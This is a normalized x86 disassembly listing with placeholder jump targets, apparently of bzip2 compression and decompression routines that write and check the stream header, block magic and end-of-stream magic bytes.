mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x2e ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x30 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x32 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x34 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x36 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x38 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x3a ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x3c ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x3e ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x40 ]
movzx ecx [ edi + eax ]
add esp 0x40
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x42 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x44 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x46 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x48 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x4a ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x4c ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x4e ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x50 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x52 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x54 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x56 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x58 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x5a ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x5c ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x5e ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x60 ]
movzx ecx [ edi + eax ]
add esp 0x40
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
mov eax [ ebp - 0xc ]
movzx eax [ ebx + eax * 2 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10015822
pop ecx
pop ecx
jmp r-xdata
sub_10017335
push ecx
push ebx
push esi
mov esi eax
push edi
mov edi [ esi + 0x44 ]
xor ebx ebx
cmp edi ebx
jle r-xdata
mov eax [ esi + 0x14 ]
add eax [ esi + 0x44 ]
cmp [ esi + 0x26c ] 0x1
push 0x8
mov [ esi + 0x2c ] eax
pop edi
jne r-xdata
lea eax [ esi + 0x260 ]
mov edx [ eax ]
not edx
lea ecx [ esi + 0x264 ]
mov [ eax ] edx
mov eax [ ecx ]
rol eax 0x1
xor eax edx
mov [ ecx ] eax
mov ecx [ esi + 0x26c ]
cmp ecx 0x1
jle r-xdata
cmp [ esi + 0x44 ] ebx
jle r-xdata
push edi
push 0x42
pop ecx
mov eax esi
mov [ esi + 0x25c ] ebx
mov [ esi + 0x258 ] ebx
call sub_10015822
pop ecx
push edi
push 0x5a
pop ecx
call sub_10015822
pop ecx
push edi
push 0x68
pop ecx
call sub_10015822
mov al [ esi + 0x270 ]
add al 0x30
pop ecx
movzx ecx al
push edi
mov eax esi
call sub_10015822
pop ecx
cmp [ esi + 0x268 ] 0x2
jl r-xdata
mov [ esi + 0x4c ] ebx
cmp [ esp + 0x14 ] bl
je r-xdata
push edi
push 0x31
pop ecx
mov eax esi
call sub_10015822
pop ecx
push edi
push 0x41
pop ecx
call sub_10015822
pop ecx
push edi
push 0x59
pop ecx
call sub_10015822
pop ecx
push edi
push 0x26
pop ecx
call sub_10015822
pop ecx
push edi
push 0x53
pop ecx
call sub_10015822
pop ecx
push edi
push 0x59
pop ecx
call sub_10015822
mov ebx [ esi + 0x260 ]
pop ecx
call sub_1001587d
push 0x1
xor ecx ecx
call sub_10015822
pop ecx
mov ecx [ esi + 0x1c ]
push 0x18
call sub_10015822
pop ecx
call sub_100158ba
call sub_10015a50
xor ebx ebx
mov edi esi
call sub_1001a821
push edi
push eax
push edx
push ecx
push r--data
call sub_10022fff
add eax 0x40
push eax
call sub_100231b4
add esp 0x18
pop edi
pop esi
pop ebx
pop ecx
retn
push edi
push 0x17
pop ecx
mov eax esi
call sub_10015822
pop ecx
push edi
push 0x72
pop ecx
call sub_10015822
pop ecx
push edi
push 0x45
pop ecx
call sub_10015822
pop ecx
push edi
push 0x38
pop ecx
call sub_10015822
pop ecx
push edi
push 0x50
pop ecx
call sub_10015822
pop ecx
push edi
mov ecx 0x90
call sub_10015822
lea edi [ esi + 0x264 ]
mov ebx [ edi ]
pop ecx
call sub_1001587d
cmp [ esi + 0x268 ] 0x2
jl r-xdata
cmp [ esi + 0x25c ] 0x0
jle r-xdata
push [ edi ]
push r--data
call sub_10022fff
add eax 0x40
push eax
call sub_100231b4
add esp 0xc
lea eax [ esi + 0x258 ]
mov ecx [ esi + 0x4c ]
mov bl [ eax + 0x3 ]
mov edx [ esi + 0x2c ]
mov [ ecx + edx ] bl
inc [ esi + 0x4c ]
shl [ eax ] 0x8
add [ esi + 0x25c ] 0xfffffff8
cmp [ esi + 0x25c ] 0x0
jg r-xdata
sub_10017508
push ebp
mov ebp esp
sub esp 0x80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x4 ]
push esi
mov esi [ ebx ]
xor ecx ecx
push edi
cmp eax 0xa
jne r-xdata
mov ecx [ ebx + 0xfa14 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ ebx + 0xfa18 ]
mov [ ebp - 0x1c ] ecx
mov ecx [ ebx + 0xfa1c ]
mov [ ebp - 0x3c ] ecx
mov ecx [ ebx + 0xfa20 ]
mov [ ebp - 0x60 ] ecx
mov ecx [ ebx + 0xfa24 ]
mov [ ebp - 0x44 ] ecx
mov ecx [ ebx + 0xfa28 ]
mov [ ebp - 0x50 ] ecx
mov ecx [ ebx + 0xfa2c ]
mov [ ebp - 0x64 ] ecx
mov ecx [ ebx + 0xfa30 ]
mov [ ebp - 0x24 ] ecx
mov ecx [ ebx + 0xfa34 ]
mov [ ebp - 0x28 ] ecx
mov ecx [ ebx + 0xfa38 ]
mov [ ebp - 0x54 ] ecx
mov ecx [ ebx + 0xfa3c ]
mov [ ebp - 0x30 ] ecx
mov ecx [ ebx + 0xfa40 ]
mov [ ebp - 0x18 ] ecx
mov ecx [ ebx + 0xfa44 ]
mov [ ebp - 0x20 ] ecx
mov ecx [ ebx + 0xfa48 ]
mov [ ebp - 0x74 ] ecx
mov ecx [ ebx + 0xfa4c ]
mov [ ebp - 0x34 ] ecx
mov ecx [ ebx + 0xfa50 ]
mov [ ebp - 0x80 ] ecx
mov ecx [ ebx + 0xfa54 ]
mov [ ebp - 0x14 ] ecx
mov ecx [ ebx + 0xfa58 ]
mov [ ebp - 0x2c ] ecx
mov ecx [ ebx + 0xfa5c ]
mov [ ebp - 0x6c ] ecx
mov ecx [ ebx + 0xfa60 ]
mov [ ebp - 0x70 ] ecx
mov ecx [ ebx + 0xfa64 ]
mov [ ebp - 0x5c ] ecx
mov ecx [ ebx + 0xfa68 ]
mov [ ebp - 0x48 ] ecx
mov ecx [ ebx + 0xfa6c ]
mov [ ebp - 0x40 ] ecx
mov ecx [ ebx + 0xfa70 ]
add eax 0xfffffff6
mov [ ebp - 0x4c ] ecx
cmp eax 0x28
ja r-xdata
mov [ ebx + 0xfa14 ] ecx
mov [ ebx + 0xfa18 ] ecx
mov [ ebx + 0xfa1c ] ecx
mov [ ebx + 0xfa20 ] ecx
mov [ ebx + 0xfa24 ] ecx
mov [ ebx + 0xfa28 ] ecx
mov [ ebx + 0xfa2c ] ecx
mov [ ebx + 0xfa30 ] ecx
mov [ ebx + 0xfa34 ] ecx
mov [ ebx + 0xfa38 ] ecx
mov [ ebx + 0xfa3c ] ecx
mov [ ebx + 0xfa40 ] ecx
mov [ ebx + 0xfa44 ] ecx
mov [ ebx + 0xfa48 ] ecx
mov [ ebx + 0xfa4c ] ecx
mov [ ebx + 0xfa50 ] ecx
mov [ ebx + 0xfa54 ] ecx
mov [ ebx + 0xfa58 ] ecx
mov [ ebx + 0xfa5c ] ecx
mov [ ebx + 0xfa60 ] ecx
mov [ ebx + 0xfa64 ] ecx
mov [ ebx + 0xfa68 ] ecx
mov [ ebx + 0xfa6c ] ecx
mov [ ebx + 0xfa70 ] ecx
push 0xfa1
call sub_100143a7
mov edi 0xff
jmp [ eax * 4 + jump_table_10019330 ]
mov [ ebx + 0x4 ] 0xa
jmp r-xdata
mov [ ebx + 0x4 ] 0xb
jmp r-xdata
mov [ ebx + 0x4 ] 0xc
jmp r-xdata
mov [ ebx + 0x4 ] 0xd
jmp r-xdata
mov [ ebx + 0x4 ] 0xe
jmp r-xdata
mov [ ebx + 0x4 ] 0xf
jmp r-xdata
mov [ ebx + 0x4 ] 0x10
jmp r-xdata
mov [ ebx + 0x4 ] 0x11
jmp r-xdata
mov [ ebx + 0x4 ] 0x12
jmp r-xdata
mov [ ebx + 0x4 ] 0x13
jmp r-xdata
mov [ ebx + 0x4 ] 0x14
jmp r-xdata
mov [ ebx + 0x4 ] 0x15
jmp r-xdata
mov [ ebx + 0x4 ] 0x16
jmp r-xdata
mov [ ebx + 0x4 ] 0x17
jmp r-xdata
mov [ ebx + 0x4 ] 0x18
jmp r-xdata
mov [ ebx + 0x4 ] 0x19
jmp r-xdata
mov [ ebx + 0x4 ] 0x1a
jmp r-xdata
mov [ ebx + 0x4 ] 0x1b
jmp r-xdata
mov [ ebx + 0x4 ] 0x1c
jmp r-xdata
mov [ ebx + 0x4 ] 0x1d
jmp r-xdata
mov [ ebx + 0x4 ] 0x1e
jmp r-xdata
mov [ ebx + 0x4 ] 0x1f
jmp r-xdata
mov [ ebx + 0x4 ] 0x20
jmp r-xdata
mov [ ebx + 0x4 ] 0x23
jmp r-xdata
mov [ ebx + 0x4 ] 0x22
jmp r-xdata
mov [ ebx + 0x4 ] 0x21
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov [ ebx + 0x4 ] 0x24
jmp r-xdata
mov [ ebx + 0x4 ] 0x25
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov [ ebx + 0x4 ] 0x26
jmp r-xdata
mov [ ebx + 0x4 ] 0x27
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov [ ebx + 0x4 ] 0x28
jmp r-xdata
mov [ ebx + 0x4 ] 0x29
jmp r-xdata
mov [ ebx + 0x4 ] 0x2a
jmp r-xdata
mov [ ebx + 0x4 ] 0x2b
jmp r-xdata
mov [ ebx + 0x4 ] 0x2c
jmp r-xdata
mov [ ebx + 0x4 ] 0x2d
jmp r-xdata
mov [ ebx + 0x4 ] 0x2e
jmp r-xdata
mov [ ebx + 0x4 ] 0x2f
jmp r-xdata
mov [ ebx + 0x4 ] 0x30
jmp r-xdata
mov [ ebx + 0x4 ] 0x31
jmp r-xdata
mov [ ebx + 0x4 ] 0x32
jmp r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x1
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x1
jl r-xdata
cmp [ ebx + 0x20 ] 0x1
jl r-xdata
cmp [ ebx + 0x20 ] 0x3
jl r-xdata
cmp [ ebx + 0x20 ] 0xf
jl r-xdata
cmp [ ebx + 0x20 ] 0x1
jl r-xdata
cmp [ ebx + 0x20 ] 0x1
jl r-xdata
cmp [ ebx + 0x20 ] 0x1
jl r-xdata
cmp [ ebx + 0x20 ] 0x5
jl r-xdata
cmp [ ebx + 0x20 ] ecx
jl r-xdata
cmp [ ebx + 0x20 ] 0x1
jl r-xdata
cmp [ ebx + 0x20 ] ecx
jl r-xdata
cmp [ ebx + 0x20 ] 0x1
jl r-xdata
cmp [ ebx + 0x20 ] ecx
jl r-xdata
cmp [ ebx + 0x20 ] 0x1
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x42
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x5a
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x68
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp eax 0x31
mov [ ebx + 0x24 ] eax
jl r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x17
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x41
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x59
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x26
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x53
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x59
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
lea ecx [ ebx + 0xc58 ]
mov edx [ ecx ]
and eax edi
movzx eax al
shl edx 0x8
or edx eax
mov [ ecx ] edx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
lea ecx [ ebx + 0xc58 ]
mov edx [ ecx ]
and eax edi
movzx eax al
shl edx 0x8
or edx eax
mov [ ecx ] edx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
lea ecx [ ebx + 0xc58 ]
mov edx [ ecx ]
and eax edi
movzx eax al
shl edx 0x8
or edx eax
mov [ ecx ] edx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
lea ecx [ ebx + 0xc58 ]
mov edx [ ecx ]
and eax edi
movzx eax al
shl edx 0x8
or edx eax
mov [ ecx ] edx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x1 ]
shr eax cl
and eax 0x1
dec edx
and [ ebx + 0x34 ] 0x0
mov [ ebx + 0x20 ] edx
mov [ ebx + 0x10 ] al
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
mov ecx [ ebx + 0x34 ]
add edx 0xfffffff8
shl ecx 0x8
and eax edi
movzx eax al
or ecx eax
mov [ ebx + 0x20 ] edx
mov [ ebx + 0x34 ] ecx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
mov ecx [ ebx + 0x34 ]
add edx 0xfffffff8
shl ecx 0x8
and eax edi
movzx eax al
or ecx eax
mov [ ebx + 0x20 ] edx
mov [ ebx + 0x34 ] ecx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x20 ]
mov edx [ ebx + 0x1c ]
lea ecx [ eax - 0x8 ]
shr edx cl
add eax 0xfffffff8
mov [ ebx + 0x20 ] eax
mov eax [ ebx + 0x34 ]
and edx edi
movzx ecx dl
shl eax 0x8
or eax ecx
mov [ ebx + 0x34 ] eax
jl r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x1 ]
shr eax cl
mov ecx [ ebp - 0x10 ]
and eax 0x1
dec edx
cmp al 0x1
sete al
inc [ ebp - 0x10 ]
mov [ ebx + 0x20 ] edx
mov [ ebx + ecx + 0xd6c ] al
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x1 ]
shr eax cl
and eax 0x1
dec edx
mov [ ebx + 0x20 ] edx
cmp al 0x1
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x3 ]
shr eax cl
add edx 0xfffffffd
mov [ ebx + 0x20 ] edx
and eax 0x7
cmp eax 0x2
mov [ ebp - 0x44 ] eax
jl r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0xf ]
shr eax cl
add edx 0xfffffff1
mov [ ebx + 0x20 ] edx
and eax 0x7fff
cmp eax 0x1
mov [ ebp - 0x50 ] eax
jl r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x1 ]
shr eax cl
and eax 0x1
dec edx
mov [ ebx + 0x20 ] edx
test al al
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x1 ]
shr eax cl
and eax 0x1
dec edx
mov [ ebx + 0x20 ] edx
test al al
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x1 ]
shr eax cl
and eax 0x1
dec edx
mov [ ebx + 0x20 ] edx
test al al
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x5 ]
shr eax cl
add edx 0xfffffffb
mov [ ebx + 0x20 ] edx
and eax 0x1f
and [ ebp - 0x10 ] 0x0
mov [ ebp - 0x34 ] eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov esi [ ebp - 0x14 ]
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
sub edx esi
xor edi edi
mov ecx edx
shr eax cl
inc edi
mov ecx esi
shl edi cl
dec edi
and eax edi
mov [ ebp - 0x2c ] eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
mov esi [ ebp - 0x14 ]
lea ecx [ edx - 0x1 ]
shr eax cl
mov ecx [ ebp - 0x2c ]
add ecx ecx
and eax 0x1
dec edx
or ecx eax
mov [ ebp - 0x6c ] eax
mov [ ebp - 0x2c ] ecx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov esi [ ebp - 0x14 ]
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
sub edx esi
xor edi edi
mov ecx edx
shr eax cl
inc edi
mov ecx esi
shl edi cl
dec edi
and eax edi
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
mov esi [ ebp - 0x14 ]
lea ecx [ edx - 0x1 ]
shr eax cl
mov ecx [ ebp - 0x2c ]
add ecx ecx
and eax 0x1
dec edx
mov [ ebp - 0x6c ] eax
or eax ecx
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
sub edx [ ebp - 0x14 ]
mov eax [ ebx + 0x1c ]
xor esi esi
mov ecx edx
shr eax cl
mov ecx [ ebp - 0x14 ]
inc esi
shl esi cl
dec esi
and eax esi
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x1 ]
shr eax cl
mov ecx [ ebp - 0x2c ]
add ecx ecx
and eax 0x1
dec edx
mov [ ebp - 0x6c ] eax
or eax ecx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x72
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x45
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x38
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x50
jne r-xdata
